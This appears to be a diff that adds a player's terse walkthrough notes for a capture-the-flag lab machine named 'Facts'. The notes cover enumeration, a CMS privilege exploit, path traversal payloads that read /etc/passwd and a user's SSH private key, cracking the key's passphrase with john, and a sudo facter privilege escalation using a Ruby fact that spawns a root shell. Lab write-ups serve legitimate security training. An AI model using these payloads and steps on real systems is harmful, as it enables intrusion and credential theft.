@@ -1,0 +1,56 @@
+[Profile]{
+Machine: Facts 
+ip: 10.129.24.115 
+}
+
+[Enumeration]{
+facts.nmap
+facts.gob
+
+/search?page=2&q=
+
+/400 /404 /500 --> check the logs
+/_framework/blazor.webassembly.js --^
+/captcha /error /robots.txt /robots /rss 
+/sitemap.gz /sitemap /sitemap.xml
+/up
+
+
+/public /randomfacts
+/sitemap
+/rss version="2.0" --> vulnerable --> CVE-2025-23467 
+(https://patchstack.com/database/wordpress/plugin/rss-news-scroller/vulnerability/wordpress-rss-news-scroller-plugin-2-0-0-csrf-to-stored-xss-vulnerability?_s_id=cve)
+
+/up --> background green
+
+/admin --> /admin/login
+If lt IE 9
+- html5shiv/3.7.2
+- respond/1.4.2
+}
+
+[Exploitation]{
+/admin --> create an account
+Cameleon CMS version 2.9.0 --> cve 2025 2304 --> Admin on facts.htb
+
+|---> Admin rights --> Arbitral path traversal --> admin/media/download_private_file?file=../../../../../../etc/passwd
+  |--> admin/media/download_private_file?file=../../../../../../home/william/user.txt --> USER FLAG
+
+Then use to path traversal to read and get fruitful informations ( /etc/passwd, sshd_config, id_ed25519 ) through ../home/trivia/.ssh/id_ed25519
+  |->   have to get the passphrase 
+                |---> python3 ssh2python.py id_ed25519 > key.john --> john --wordlist=../Expressway/rockyou.txt key.john ---> dragonballz
+
+  Here we ssh and we're in !
+    |--> Then sudo -l --> /usr/bin/facter --> use it to run with options --customs-dir a ruby file which run a shell which would be a root shell through suid 
+}
+
+[PrivEsc]{
+      |--> Ruby File contains should be on be a directory that you will be specifying in --customs-dir :
+            Facter.add(:pwn) do
+              setcode do
+              system("/bin/bash")
+              end
+            end
+
+            \---> root shell ---> root.txt
+}
